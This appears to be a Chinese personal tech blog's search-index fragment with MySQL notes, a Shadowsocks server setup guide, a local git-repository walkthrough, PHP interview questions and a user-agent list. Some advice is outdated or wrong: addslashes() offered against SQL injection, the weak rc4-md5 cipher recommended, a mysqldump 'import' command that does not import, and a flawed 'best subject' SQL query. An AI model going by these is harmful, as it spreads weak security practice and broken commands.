MySQL中的日志</h2><p>共4种：</p><ol><li>错误日志：记录mysql服务的启动、运行、停止时出现的问题</li><li>查询日志（通用日志）：记录用户的所有操作</li><li>二进制日志：记录所有更改数据的语句，可以用于数据复制</li><li>慢查询日志：记录所有执行时间超过long_query_time的所有查询。官方的慢查询阈值只能设置大于1秒的，使用microslow-patch可以查询毫秒级的。</li></ol><p>除了错误日志默认开启外，其他日志都是默认关闭的。但日志既会影响mysql的性能，又会占用大量磁盘空间。因此，如果不必要，应尽可能少地开启日志。根据不同的使用环境，考虑开启不同的日志。例如开发环境中优化查询效率低的语句，可以开启慢查询日志，或者生产环境中发现某些SQL执行特别慢也可以开启。如果磁盘空间不是特充足可以在高峰期间开启，在捕获到查询慢的SQL之后再关闭慢查询日志。如果需要搭建复制环境，那么就一定要开启二进制日志，如果数据特别重要也建议开启二进制日志，以便数据库损坏的时候也可以通过二进制日志挽救一部分数据。通用日志无论在哪种情况下，一般不建议开启 。</p><p>常用命令</p><ul><li>查看日志信息：<code>show variables like &#39;%log_%&#39;;</code></li><li>查看错误日志的存储位置：<code>show variables LIKE &#39;log_error&#39;;</code></li><li>删除错误日志：<code>flush logs;</code><ul><li>MySQL 5.5.7版本前，<code>flush logs</code>可以将错误日志文件重命名为<code>filename.err_old</code>，并创建新的日志文件。但是从MySQL 5.5.7开始，<code>flush logs</code>只是重新打开日志文件，并不做日志备份和创建的操作。如果日志文件不存在，mysql启动或者执行flush logs时会创建新的日志文件</li></ul></li></ul><p>Mac使用HomeBrew安装的MySQL是没有my.cnf文件的，需要自己手动创建，具体信息请查看另一个笔记：<a href="https://app.yinxiang.com/shard/s27/nl/1310329143/2918975e-22e9-4749-a19c-38d792fdf8d5/" target="_blank" rel="noopener">在 Mac 下用 Homebrew 安装 MySQL配置文件my.cnf问题</a></p><h2 id="九、PHP连接MySQL的方式"><a href="#九、PHP连接MySQL的方式" class="headerlink" title="九、PHP连接MySQL的方式"></a>九、PHP连接MySQL的方式</h2><p>当考虑连接到MySQL数据库服务器的时候，有三种主要的API可供选择：</p><ul><li>PHP的MySQL扩展</li><li>PHP的MySQLi扩展</li><li>PHP数据对象（PDO）</li></ul><p>三者各有优缺点：</p><ol><li><p>mysql扩展提供了一个面向过程 的接口，并且是针对MySQL4.1.3或更早版本设计的。因此，这个扩展虽然可以与MySQL4.1.3或更新的数据库服务端 进行交互，但并不支持后期MySQL服务端提供的一些特性。</p></li><li><p>MySQLi扩展可以用于使用 MySQL4.1.3或更新版本中新的高级特性。其主要优势有：</p><ul><li>面向对象接口</li><li>prepared语句支持</li><li>多语句执行支持</li><li>事务支持</li><li>增强的调试能力</li><li>嵌入式服务支持</li></ul></li><li><p>PDO提供了一个统一的API接口可以使得你的PHP应用不去关心具体要 连接的数据库服务器系统类型。也就是说，如果你使用PDO的API，可以在任何需要的时候无缝切换数据库服务器，比如从Firebird 到MySQL，仅仅需要修改很少的PHP代码。<br>PDO的优点在于，它是一个干净的，简单的，可移植的API，<strong>它最主要的缺点是会限制让你不能使用 后期MySQL服务端提供所有的数据库高级特性</strong>。比如，PDO不允许使用MySQL支持的多语句执行。</p></li></ol><h2 id="十、SQL注入"><a href="#十、SQL注入" class="headerlink" title="十、SQL注入"></a>十、SQL注入</h2><p><strong>永远不要信任外界输入的数据</strong>，<strong><em>特别是来自于客户端的</em></strong>，包括选择框、表单隐藏域和 cookie。</p><ul><li>永远不要使用超级用户或所有者帐号去连接数据库。要用权限被严格限制的帐号。</li><li>检查输入的数据是否具有所期望的数据格式。</li><li>使用数据库特定的敏感字符转义函数（比如 mysql_escape_string() 和 sql_escape_string()）把用户提交上来的非数字数据进行转义。如果数据库没有专门的敏感字符转义功能的话 addslashes() 和 str_replace() 可以代替完成这个工作。</li><li>尽量避免显示有关数据库的任何信息，尤其是数据库结构。</li><li>可以选择使用数据库的存储过程和预定义指针等特性来抽象数库访问，使用户不能直接访问数据表和视图。但这个办法又有别的影响。</li></ul><p>mysqli没有提供一个特殊的方法用于打开持久化连接。需要打开一个持久化连接时，你必须在 连接时在主机名前增加<code>p:</code>。</p><p>数据的导出及导入：<br>Linux下操作：<br>导出：<code>mysqldump -h -u -p 数据库名1 [数据库名2]&gt;本地地址</code><br>导入：<code>mysql -h -u -p 数据库名&lt;本地地址</code></p><h2 id="十一、其他"><a href="#十一、其他" class="headerlink" title="十一、其他"></a>十一、其他</h2><h3 id="11-1-避免重复插入记录"><a href="#11-1-避免重复插入记录" class="headerlink" title="11.1 避免重复插入记录"></a>11.1 避免重复插入记录</h3><p>1、使用<code>IGNORE</code>关键字。对于<code>PRIMARY KEY</code>或<code>UNIQUE</code>的字段来说，如果数据不重复则插入，重复则忽略（报警告，数据不会插入，不影响正常执行，无此关键字会报错误）。如：<code>INSERT IGNORE INTO test(id,name) VALUES(1,&#39;jack&#39;);</code><br>2、使用<code>REPLACE</code>关键字。该SQL与<code>IGNORE</code>的区别在于，如果数据重复，则先将旧的数据删除，然后插入新的。所以，执行该语句的影响行可以看出是否有重复的数据（为1表示无重复，大于1为重复）。<br>3、使用<code>ON DUPLICATE KEY UPDATE</code>，该句子是在有重复数据的时候，用新数据替换旧数据。</p><h3 id="11-2-统计重复数据"><a href="#11-2-统计重复数据" class="headerlink" title="11.2 统计重复数据"></a>11.2 统计重复数据</h3><p>比如统计重名的学生数量：<code>SELECT COUNT(name) AS deplication,name FROM student_info GROUP BY name HAVING deplication &gt; 1;</code></p><h3 id="11-3-数据导出"><a href="#11-3-数据导出" class="headerlink" title="11.3 数据导出"></a>11.3 数据导出</h3><p>需有FILE权限。</p><h4 id="方法一-使用OUTFILE"><a href="#方法一-使用OUTFILE" class="headerlink" title="方法一 使用OUTFILE"></a>方法一 使用OUTFILE</h4><p><code>SELECT 字段 FROM 表名 [WHERE等过滤条件] INTO OUTFILE &#39;保存路径&#39; [CHARACTER SET GBK] [FIELDS TERMINATED BY &#39;,&#39; [[ENCLOSED BY &#39;&quot;&#39;] LINES TERMINATED BY &#39;\n&#39;]];</code></p><ul><li>注意：由于xls和xlsx的中文默认gbk编码，因此如果数据表编码不一致，需在导出时使用<code>CHARACTER SET GBK</code>指定导出编码；在使用csv（Comma-Separated Values, 逗号分隔值）格式时，需使用<code>FIELDS TERMINATED BY &#39;,&#39;</code>指定字段分隔，否则会出现格式错误。</li></ul><h4 id="方法二-使用mysqldump命令"><a href="#方法二-使用mysqldump命令" class="headerlink" title="方法二 使用mysqldump命令"></a>方法二 使用mysqldump命令</h4><p><code>$mysqldump -u user -p pwd 数据库名 [表名] &gt; 文件;</code>导出指定数据库或指定数据表<br><code>$mysqldump -u user -p pwd --all-databases &gt; 文件;</code>备份所有数据库</p><h3 id="11-4-数据导入"><a href="#11-4-数据导入" class="headerlink" title="11.4 数据导入"></a>11.4 数据导入</h3><p>需有FILE权限。</p><h4 id="方法一-使用LOAD-DATA"><a href="#方法一-使用LOAD-DATA" class="headerlink" title="方法一 使用LOAD DATA"></a>方法一 使用LOAD DATA</h4><p><code>LOAD DATA [LOCAL] INFILE &#39;文件&#39; INTO TABLE 表名 [CHARACTER SET GBK] [FIELDS TERMINATED BY &#39;,&#39; OPTIONALLY ENCLOSED BY &#39;&quot;&#39; LINES TERMINATED BY &#39;\n&#39;];</code></p><ul><li>注意数据表的编码，即使同为GBK编码，也会出现报错的情况，因此最好在导入前确定数据表与文件的编码，然后指定编码导入。</li><li><strong>无论在导入还是导出csv格式文件时，都需要使用<code>FIELDS TERMINATED BY &#39;,&#39;</code></strong></li><li>如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。</li></ul><h4 id="方法二-使用mysqldump命令-1"><a href="#方法二-使用mysqldump命令-1" class="headerlink" title="方法二 使用mysqldump命令"></a>方法二 使用mysqldump命令</h4><p><code>$mysqldump -u user -p pwd 数据库名 [表名] &lt; 文件;</code></p><h4 id="方法三-使用mysqlimport"><a href="#方法三-使用mysqlimport" class="headerlink" title="方法三 使用mysqlimport"></a>方法三 使用mysqlimport</h4><p><code>$mysqlimport -u user -p [--local] [--fields-terminated-by=&quot;:&quot; --lines-terminated-by=&quot;\r\n&quot; --columns=字段1，字段2] 数据库名 文件名</code></p><p>更多数据导入/导出信息请点击：<a href="https://segmentfault.com/a/1190000003941100" target="_blank" rel="noopener">如何将 JSON, Text, XML, CSV 数据文件导入 MySQL</a></p><h3 id="11-5-索引的性能"><a href="#11-5-索引的性能" class="headerlink" title="11.5 索引的性能"></a>11.5 索引的性能</h3><ul><li>索引改善检索操作的性能，但降低数据插入、修改和删除的性能。因为在执行这些操作时，MySQL必须动态地更新索引。</li><li>索引数据可能要占用大量的存储空间。</li><li>数据量少的字段不适合做索引。并非所有数据都适合做索引。取值不多的数据（如州）不如具有更多可能值的数据（如姓名），能通过索引得到那么多的好处。</li><li>用于排序的字段适合添加索引。索引用于数据过滤和数据排序。如果你经常以某种特定的顺序排序数据，则该数据可能适合做索引。</li><li>可以在索引中定义多个列（如，州和城市）。这样的索引仅在以州+城市的排序时有用，如果以城市排序，则该索引并没什么用处。</li><li><strong>索引的效率随表数据的增加或改变而变化。许多DBA发现，过去创建的某个理想的索引经过几个月的数据处理后可能变得不再理想了。最好定期检查索引，并根据需要对索引进行调整。</strong></li></ul><h3 id="11-6-一些术语释义"><a href="#11-6-一些术语释义" class="headerlink" title="11.6 一些术语释义"></a>11.6 一些术语释义</h3><ul><li>DDL(Data Definition Language)：数据定义语言</li><li>DML(Data Manipulation Language)：数据操作语言</li><li>DRL(Data Retrieval Language)：数据查询语言</li></ul><p>更多术语解释：<a href="https://dev.mysql.com/doc/refman/5.7/en/glossary.html" target="_blank" rel="noopener">MySQL Glossary</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自建shadowsocks服务器教程</title>
      <link href="/post/shadowsocks/"/>
      <url>/post/shadowsocks/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cxihzkzj30hs0a0aaj.jpg" alt=""></p><a id="more"></a><p>搬瓦工系统自带的shadowsocks只支持CentOS 6及以下，那就自己搭建一个吧。</p><h3 id="1-环境："><a href="#1-环境：" class="headerlink" title="1. 环境："></a>1. 环境：</h3><p>服务器端：CentOs 7 64位（全新）<br>客户端：OS X 10.12.5 + ShadowsocksX-NG 1.5.0</p><h3 id="2-安装EPEL"><a href="#2-安装EPEL" class="headerlink" title="2. 安装EPEL"></a>2. 安装EPEL</h3><p><code>$ sudo yum -y install epel-release</code></p><h3 id="3-安装pip"><a href="#3-安装pip" class="headerlink" title="3.安装pip"></a>3.安装pip</h3><p><code>$ sudo yum -y install python-pip</code></p><h3 id="4-安装shadowsocks"><a href="#4-安装shadowsocks" class="headerlink" title="4. 安装shadowsocks"></a>4. 安装shadowsocks</h3><p><code>$ sudo pip install shadowsocks</code></p><h3 id="5-配置shadowsocks"><a href="#5-配置shadowsocks" class="headerlink" title="5. 配置shadowsocks"></a>5. 配置shadowsocks</h3><p><code>mkdir /etc/shadowsocks/</code><br><code>$ vi /etc/shadowsocks/config.json</code><br>内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"server"</span>:<span class="string">"your_server_ip"</span>,</span><br><span class="line">  <span class="attr">"server_port"</span>:<span class="number">443</span>,</span><br><span class="line">  <span class="attr">"password"</span>:<span class="string">"yourpassword"</span>,</span><br><span class="line">  <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">  <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">  <span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中各字段的含义：</p><ul><li>server：服务器 IP地址 (IPv4/IPv6)</li><li>server_port：服务器监听的端口，一般设为80，443等，注意不要设为使用中的端口</li><li>password：设置密码，自定义</li><li>timeout：超时时间（秒）</li><li>method：加密方法，可选择 “aes-256-cfb”, “rc4-md5”等等。推荐使用 “rc4-md5”</li><li>fast_open：true 或 false。如果你的服务器 Linux 内核在3.7+，可以开启 fast_open 以降低延迟。</li><li>workers：workers数量，默认为 1。</li></ul><h4 id="5-1-多账户配置"><a href="#5-1-多账户配置" class="headerlink" title="5.1 多账户配置"></a>5.1 多账户配置</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"server"</span>:<span class="string">"your_server_ip"</span>,</span><br><span class="line">  <span class="attr">"port_password"</span>:&#123;</span><br><span class="line">       <span class="attr">"8381"</span>:<span class="string">"pass1"</span>,</span><br><span class="line">       <span class="attr">"8382"</span>:<span class="string">"pass2"</span>,</span><br><span class="line">       <span class="attr">"8383"</span>:<span class="string">"pass3"</span>,</span><br><span class="line">       <span class="attr">"8384"</span>:<span class="string">"pass4"</span></span><br><span class="line">       &#125;,</span><br><span class="line">  <span class="attr">"timeout"</span>:<span class="number">60</span>,</span><br><span class="line">  <span class="attr">"method"</span>:<span class="string">"rc4-md5"</span>,</span><br><span class="line">  <span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"workers"</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-设置shadowsocks开机自启"><a href="#6-设置shadowsocks开机自启" class="headerlink" title="6. 设置shadowsocks开机自启"></a>6. 设置shadowsocks开机自启</h3><p><code>vi /etc/systemd/system/shadowsocks.service</code><br>内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Shadowsocks</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">TimeoutStartSec=0</span><br><span class="line">ExecStart=/usr/bin/ssserver -c /etc/shadowsocks/config.json</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>执行以下命令启动 shadowsocks 服务：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">enable</span> shadowsocks</span><br><span class="line">systemctl <span class="keyword">start</span> shadowsocks</span><br></pre></td></tr></table></figure><p>执行命令<code>systemctl status shadowsocks</code>查看ss状态<br>如果 shadowsocks 启动失败，可根据日志 <code>/var/log/shadowsocks.log</code> 信息进行排查。</p><hr><p>参考文章：</p><ol><li><a href="https://php-rmcr7.rhcloud.com/shadowsocks-server/" target="_blank" rel="noopener">教你如何搭建自己的Shadowsocks服务器</a></li><li><a href="https://yuyii.com/2015/12/28/shadowsocks-systemd/" target="_blank" rel="noopener">Shadowsocks systemd 配置</a></li><li><a href="https://morning.work/page/2015-12/install-shadowsocks-on-centos-7.html" target="_blank" rel="noopener">在 CentOS 7 下安装配置 shadowsocks</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地git仓库间的通信</title>
      <link href="/post/communication-with-local-repo/"/>
      <url>/post/communication-with-local-repo/</url>
      
        <content type="html"><![CDATA[<p>同一台电脑的两个git仓库间如何通信呢？</p><a id="more"></a><p>首先要明确一点：git是<strong>分布式</strong>版本管理工具。也就是说各个git仓库间是<strong>相互独立</strong>的。</p><p>现在，我们在<code>admin</code>家目录下新建两个git仓库，分别取名为<code>t1</code>和<code>t2</code>：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[admin<span class="meta">@bravo</span> ~]$ git init t1</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> <span class="regexp">/home/</span>admin<span class="regexp">/t1/</span>.git/</span><br><span class="line">[admin<span class="meta">@bravo</span> ~]$ git init t2</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> <span class="regexp">/home/</span>admin<span class="regexp">/t2/</span>.git/</span><br><span class="line">[admin<span class="meta">@bravo</span> t1]$</span><br></pre></td></tr></table></figure><p>然后，进入t1目录，创建一个名为t1的文件，并加入git跟踪</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ touch <span class="built_in">t1</span></span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ git <span class="keyword">add </span>.</span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ git commit -m <span class="string">'create t1'</span></span><br><span class="line">[master (root-commit) <span class="number">701</span>f<span class="number">8b</span>8] create <span class="built_in">t1</span></span><br><span class="line"> <span class="number">0</span> files changed, <span class="number">0</span> <span class="keyword">insertions(+), </span><span class="number">0</span> deletions(-)</span><br><span class="line"> create mode <span class="number">100644</span> <span class="built_in">t1</span></span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$</span><br></pre></td></tr></table></figure><p>接下来，进入t2目录，并关联t1仓库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">admin</span>@bravo t1]$ cd ../t2</span><br><span class="line">[<span class="keyword">admin</span>@bravo t2]$ git remote <span class="keyword">add</span> t1 /home/<span class="keyword">admin</span>/t1</span><br><span class="line">[<span class="keyword">admin</span>@bravo t2]$ git remote -vv</span><br><span class="line">t1/home/<span class="keyword">admin</span>/t1 (<span class="keyword">fetch</span>)</span><br><span class="line">t1/home/<span class="keyword">admin</span>/t1 (push)</span><br></pre></td></tr></table></figure><p>最后，拉取t1目录中的文件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">admin@</span>bravo t2]$ git fetch t1</span><br><span class="line">remote: Counting objects: <span class="number">3</span>, done.</span><br><span class="line">remote: Total <span class="number">3</span> (delta <span class="number">0</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line">Unpacking objects: <span class="number">100</span>% (<span class="number">3</span>/<span class="number">3</span>), done.</span><br><span class="line">From /home/admin/t1</span><br><span class="line"> * [new branch]      master     -&gt; t1/master</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$ git merge t1/master</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$ ls</span><br><span class="line">t1</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$</span><br></pre></td></tr></table></figure><p>好了，现在你就可以在t2仓库中同步到t1仓库中的内容了，由于git能够精确到行，因此很方便文件冲突的解决。</p><p>说了这么多，这有什么用呢？<br>在我们开发时，经常是前后端分离的，而且大家的代码都在同一台测试服务器上，一个完整的功能需要前后端代码合并后才能测试，这种方式就能完美合并前后端代码了。</p><p>注意：首先要对被拉取代码的目录拥有读取权限，也就是t1目录要有r才能执行上述操作。</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常见的PHP面试题</title>
      <link href="/post/php-interview/"/>
      <url>/post/php-interview/</url>
      
        <content type="html"><![CDATA[<p>这都是我面试的血泪史啊:(</p><a id="more"></a><h3 id="一、-数组及传值方式的考察"><a href="#一、-数组及传值方式的考察" class="headerlink" title="一、 数组及传值方式的考察"></a>一、 数组及传值方式的考察</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $arr = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>];</span><br><span class="line">  <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$v) &#123;</span><br><span class="line">  <span class="comment"># code...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">  <span class="comment"># code...</span></span><br><span class="line">  &#125;</span><br><span class="line">  print_r($arr);</span><br></pre></td></tr></table></figure><p>结果是$arr = [‘a’,’b’,’b’]，你答对了吗？</p><p>反正我是想了一个礼拜才弄明白:)</p><p>解析：这道题首先要注意第一次循环中的”&amp;”符号，考察的是PHP中的引用赋值和拷贝赋值。</p><p>  最后出现“令人意外”的结果的原因就在于，第一次循环是每次把$arr元素的地址给了$v，而$v的地址在循环结束后有没被释放掉，所以第一次循环结束后$v存的是$arr[2]的<strong>地址</strong>，第二次循环是把$arr的值分别给了$v，由于此时的$v指向的是$arr[2]，所以每次指针的移动都是把当前的元素放入$arr[2]中，所以</p><ul><li>第一次循环$arr = [‘a’,’b’,’a’];</li><li>第二次循环$arr = [‘a’,’b’,’b’];</li><li>第三次循环$arr = [‘a’,’b’,’b’];</li></ul><p>第三次循环的结果就是把自己的$arr[2]的内容取出来赋给$arr[2]，所以结果是$arr = [‘a’,’b’,’b’];</p><p>因此我们<strong>在使用”&amp;”符号时，最好将其unset掉，否则会导致意外行为</strong>。</p><p>最后上一个图说明一下：<br><img src="http://ohx73ws1b.bkt.clouddn.com/foreach%E9%9D%A2%E8%AF%95%E9%A2%98.jpg" alt=""></p><p>参考资料：<a href="https://segmentfault.com/q/1010000008279730" target="_blank" rel="noopener">https://segmentfault.com/q/1010000008279730</a></p><hr><h3 id="二、-数组的考察"><a href="#二、-数组的考察" class="headerlink" title="二、 数组的考察"></a>二、 数组的考察</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">9</span>;</span><br><span class="line">$t = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">foreach</span>($t <span class="keyword">as</span> $v)</span><br><span class="line">&#123;</span><br><span class="line">$v += $a;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($t);</span><br></pre></td></tr></table></figure><p>结果是<code>1</code>而不是<code>10</code>。</p><hr><h3 id="三、-SQL的考察"><a href="#三、-SQL的考察" class="headerlink" title="三、 SQL的考察"></a>三、 SQL的考察</h3><p>现有一个学生成绩表student,内容如下：</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%AD%A6%E7%94%9F%E6%88%90%E7%BB%A9%E8%A1%A8.png" alt=""></p><p>请据表查询，</p><ol><li>用一个select查出两门及以上的不及格者的平均成绩</li><li>统计学生不及格科目的个数</li><li>获取每个学生的最佳科目及成绩</li><li>获取不及格学生的名字及科目</li></ol><p>答：</p><ol><li><p><code>select name, sum(score&lt;60) as num, avg(score) as avg_score  from student  group by name having num &gt; 1;</code><br><br><img src="http://ohx73ws1b.bkt.clouddn.com/2%E9%97%A8%E5%8F%8A%E4%BB%A5%E4%B8%8A%E4%B8%8D%E5%8F%8A%E6%A0%BC%E7%9A%84%E5%B9%B3%E5%9D%87%E5%88%86.png" alt=""></p></li><li><p><code>select name, sum(score &lt; 60) as no_pass from student group by name;</code><br><br><img src="http://ohx73ws1b.bkt.clouddn.com/%E4%B8%8D%E5%8F%8A%E6%A0%BC%E7%A7%91%E7%9B%AE%E6%95%B0.png" alt=""></p></li><li><p><code>select name, subject, score from student where score in (select max(score) as score from student group by name);</code><br><br><img src="http://ohx73ws1b.bkt.clouddn.com/%E6%9C%80%E4%BD%B3%E7%A7%91%E7%9B%AE%E5%8F%8A%E6%88%90%E7%BB%A9.png" alt=""></p></li><li><p><code>select name, group_concat(subject) as subject from (select name, subject from student where score &lt; 60) as info group by name;</code>//此处需要注意的是，子查询语句结果需要给一个alias，否则会报错<br><br><img src="http://ohx73ws1b.bkt.clouddn.com/%E4%B8%8D%E5%8F%8A%E6%A0%BC%E7%A7%91%E7%9B%AE%E5%88%97%E8%A1%A8.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UA列表</title>
      <link href="/post/browser-user-agent-list/"/>
      <url>/post/browser-user-agent-list/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87d074zw5j30b4069glv.jpg" alt=""></p><a id="more"></a><p>常见UA列表如下：</p><table><thead><tr><th align="center">BROWSER</th><th align="center">USER AGENT</th></tr></thead><tbody><tr><td align="center">Safari 10.0</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50</td></tr><tr><td align="center">Safari 10.0-iOS10-iPhone</td><td align="center">Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Safari 10.0-iOS10-iPod touch</td><td align="center">Mozilla/5.0 (iPod; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Safari 10.0-iOS10-iPad</td><td align="center">Mozilla/5.0 (iPad; CPU OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Microsoft Edge</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/13.10586</td></tr><tr><td align="center">Internet Explorer  11</td><td align="center">Mozilla/5.0 (Windows NT 6.3; Win64, x64; Trident/7.0; rv:11.0) like Gecko</td></tr><tr><td align="center">Internet Explorer  10</td><td align="center">Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)</td></tr><tr><td align="center">Internet Explorer  9</td><td align="center">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)</td></tr><tr><td align="center">Internet Explorer  8</td><td align="center">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)</td></tr><tr><td align="center">Internet Explorer  7</td><td align="center">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</td></tr><tr><td align="center">Google Chrome - Mac</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</td></tr><tr><td align="center">Google Chrome - Windows</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</td></tr><tr><td align="center">Firefox - Mac</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:46.0) Gecko/20100101 Firefox/46.0</td></tr><tr><td align="center">Firefox - Windows</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统封装小感</title>
      <link href="/post/encapsule-os-notes/"/>
      <url>/post/encapsule-os-notes/</url>
      
